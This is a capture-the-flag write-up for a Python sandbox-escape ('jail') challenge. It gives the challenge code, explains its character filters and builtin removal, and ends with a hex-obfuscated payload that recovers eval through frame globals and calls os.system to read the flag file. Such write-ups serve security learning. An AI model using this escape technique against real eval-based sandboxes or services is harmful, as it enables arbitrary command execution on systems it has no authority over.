# osujail [easy]

### Initial Analysis
The challenge involves crafting an input that passes the guards and meets the criteria for rescue in order to execute arbitrary code using `eval`.

```python
backup_len = len
backup_eval = eval
backup_print = print
backup_input = input
backup_all = all
backup_ord = ord

def rescued_osu(input):
    return input.count('o') == 1 and input.count('s') == 1 and input.count('u') == 1

def caught_by_guards(input):
    return '[' in input or ']' in input or '{' in input or '}' in input or not backup_all(0 <= backup_ord(c) <= 255 for c in input)

globals()['__builtins__'].__dict__.clear()

input = backup_input()
if caught_by_guards(input) or not rescued_osu(input):
    backup_print('[You failed to break the jail]')
else:
    backup_print(backup_eval(input,{},{}))
```

    Function Definitions:
        rescued_osu(input): Checks if the input string contains exactly one 'o', one 's', and one 'u'.
        caught_by_guards(input): Checks if the input string contains any of the characters '[', ']', '{', '}', or if any character's ASCII code is outside the range 0 to 255.

    Backup Variables:
        Backs up certain built-in functions like len, eval, print, input, etc.

    Clearing Built-in Functions:
        Clears the __builtins__ dictionary, effectively removing access to most built-in functions.

    Main Execution:
        Prompts the user for input.
        Checks if the input is caught by guards (contains forbidden characters or out-of-range ASCII codes) or if it doesn't meet the conditions for rescue (having exactly one 'o', 's', and 'u').
        If the input passes both checks, it evaluates the input using eval and prints the result. Otherwise, it prints a failure message.

### Solution
```python
(a:="".split(),a.append(b.gi_frame.f_back.f_back.__getattribute__("f_gl\x6fbal\x73").__getitem__("back\x75p_eval")("\x28\x29\x2e\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f\x2e\x5f\x5f\x62\x61\x73\x65\x5f\x5f\x2e\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f\x28\x29\x5b\x31\x33\x33\x5d\x2e\x5f\x5f\x69\x6e\x69\x74\x5f\x5f\x2e\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f\x5b\x22\x73\x79\x73\x74\x65\x6d\x22\x5d\x28\x22\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x22\x29") for b in a),*a.__getitem__(0))
```
